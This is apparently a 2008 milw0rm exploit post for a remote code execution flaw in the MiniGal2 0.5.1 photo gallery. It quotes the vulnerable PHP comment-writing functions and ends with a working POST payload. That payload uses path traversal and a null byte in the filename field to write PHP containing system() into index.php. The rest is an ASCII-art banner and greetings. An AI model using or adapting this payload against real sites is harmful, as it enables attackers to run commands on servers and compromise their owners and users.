<html><head><title>MG2 0.5.1 (filename) Remote Code Execution Vulnerability</title></head><pre>&lt;?php  
 /**********000000000000----------------------000\\\
/*-00--------++++++++++++++++++_______________)_)_________
 -- --
   -    MiniGal2(MG2) v0.5.1 remote Code Injection    |
  ___     Z okazji urodzin ¿yczê sobie wszystkiego zajebistego
                 Zawsze na odwrót lol    '''''_---&quot;
                    ___)()())0       ------------
     \                  A-L           |    &quot;&quot;&quot;&quot;&quot;&quot;
      '--==9**        Victoria  heh      .
------       gr:SID.PSYCHO ;&gt; and rest and ALL
       ---------++++++++++++=================))    
 ___ --             =======--
            ./..................
=======--////-
    VULN:[includes\mg2_functions.php]
    function writecomments($filename)  __LINE 555
  ---------
        function writecomments($filename) {
	    $filename = &quot;pictures/&quot; . $filename;
             unset($buffer);
             if (count($this-&gt;comments) != 0) {
             for ($i=0; $i &lt; count($this-&gt;comments); $i++){
             for ($j=0; $j &lt; count($this-&gt;comments[$i]); $j++){
              $buffer .= &quot;*&quot; . $this-&gt;comments[$i][$j];
             }
              $buffer .= &quot;\n&quot;;
             $fd = fopen($filename,&quot;w+&quot;);
              if (flock($fd, LOCK_EX)) { // do an exclusive lock
              ftruncate($fd, 0);
              fwrite($fd, $buffer);
              flock($fd, LOCK_UN); // release the lock
              fclose($fd);
	        $this-&gt;log(&quot;Wrote comment to '$filename'&quot;);
              } else {
	        $this-&gt;log(&quot;ERROR: Could not lock commentfile '$filename' for writing&quot;);
              echo &quot;MG2 ERROR: Could not lock $filename (function 'writecomments')&quot;;
             }
            }
         } else unlink($filename);
     }
         /\/\/\/\/\/\/\/\/\/\/\

        function addcomment() {
        $_REQUEST['filename'] = $this-&gt;charfix($_REQUEST['filename']);
        $_REQUEST['input'] = $this-&gt;charfix($_REQUEST['input']);
        $_REQUEST['email'] = $this-&gt;charfix($_REQUEST['email']);
        $_REQUEST['name'] = $this-&gt;charfix($_REQUEST['name']);
        $_REQUEST['input'] = strip_tags($_REQUEST['input'], &quot;&lt;b&gt;&lt;/b&gt;&lt;i&gt;&lt;/i&gt;&lt;u&gt;&lt;/u&gt;&lt;strong&gt;&lt;/strong&gt;&lt;em&gt;&lt;/em&gt;&quot;);
        $_REQUEST['input'] = str_replace(&quot;\n&quot;,&quot;&lt;br /&gt;&quot;,$_REQUEST['input']);
        $_REQUEST['input'] = str_replace(&quot;\r&quot;,&quot;&quot;,$_REQUEST['input']);
        if ($_REQUEST['input'] != &quot;&quot; &amp;&amp; $_REQUEST['name'] != &quot;&quot; &amp;&amp; $_REQUEST['email'] != &quot;&quot;) {
         $this-&gt;readcomments(&quot;pictures/&quot; . $_REQUEST['filename'] . &quot;.comment&quot;);
         $comment_exists = $this-&gt;select($_REQUEST['input'],$this-&gt;comments,3,1,0);
         $comment_exists = $this-&gt;select($_REQUEST['name'],$comment_exists,1,1,0);
         $comment_exists = $this-&gt;select($_REQUEST['email'],$comment_exists,2,1,0);
         if (count($comment_exists) == 0) {
           $this-&gt;comments[] = array(time(), $_REQUEST['name'], $_REQUEST['email'], $_REQUEST['input']);
           $this-&gt;writecomments($_REQUEST['filename'] . &quot;.comment&quot;);
         .....etc //
................-------------------------------------------=====================
==== As you can se THE  input data is not enough filtered 
      We can write self code in to the file 
      by sending proper POSTS 
      ex:
      POST input=a&amp;name=/ &lt;?php system('dir'); ?&gt; // &amp;email=c&amp;action=addcomment&amp;filename=../index.php%00&amp;id=5
      THE END
     
-------*/
// ALFONS LUJA just 4 fUn :P 
?&gt;

# milw0rm.com [2008-12-08]</pre></html>